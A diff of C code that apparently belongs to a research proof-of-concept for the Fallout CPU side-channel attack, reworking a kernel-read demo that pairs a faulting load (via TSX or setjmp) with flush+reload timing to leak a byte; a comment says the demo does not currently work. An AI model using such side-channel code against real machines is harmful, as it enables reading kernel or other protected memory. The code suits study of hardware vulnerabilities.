@@ -297,34 +297,33 @@ int wtf(void *mem, int page_offset) {
 }
 
 #ifdef TSX_AVAILABLE
-#define FALLOUT_FAULTY_LOAD_K if(xbegin()){maccess(mem + (attacker_address_k[(response[1]<<8)|response[2]]<<12));xend();}
+#define FALLOUT_FAULTY_LOAD_K if(xbegin()){maccess(mem + (attacker_address[0xABC]<<12));xend();}
 #else
-#define FALLOUT_FAULTY_LOAD_K if (!setjmp(buf)) maccess(mem + (attacker_address_k[(response[1]<<8)|response[2]]<<12));
+#define FALLOUT_FAULTY_LOAD_K if (!setjmp(buf)) maccess(mem + (attacker_address[0xABC]<<12));
 #endif
 
 /**
- * WTF function for the kernel-read demo. It currently does not work.
+ * WTF function for the kernel-read demo. It currently does not work :(
  * @param mem
  * @param procfile
  * @return
  */
 int kernel_wtf(void* mem, int procfile){
-    uint8_t *attacker_address_k = aligned_alloc(page_size, page_size);
-    mprotect(attacker_address_k, page_size, PROT_NONE);
     unsigned int result, i = 0;
     unsigned char response[sizeof(unsigned int) + 2];
     memset(response, 0, sizeof(unsigned int) + 2);
-    flush_cache(mem);
+    response[0] = 111;
     lseek(procfile, 0, SEEK_SET);
+    flush_cache(mem);
     read(procfile, response, sizeof(unsigned int));
     FALLOUT_FAULTY_LOAD_K
-    for (; i < 256; i++) {
-        wtf_times[i] = measure_flush_reload(mem + i * page_size);
+    for (i=1; i < 256; i++) {
+        wtf_times[i] = measure_flush_reload(mem + (i<<12));
     }
+    wtf_times[0] = INT64_MAX;
     result = get_min(wtf_times, 256);
-    //printf("Response: 0x%x, 0x%03x\n", (uint8_t)response[0], (response[1]<<8)|response[2]);
-    free(attacker_address_k);
-    return result == (uint8_t)response[0];
+    if(response[0] != 0){printf("Error: The kernel-module's memory is not page aligned!\n"); exit(1);}
+    return result == 42;
 }
 
 /**
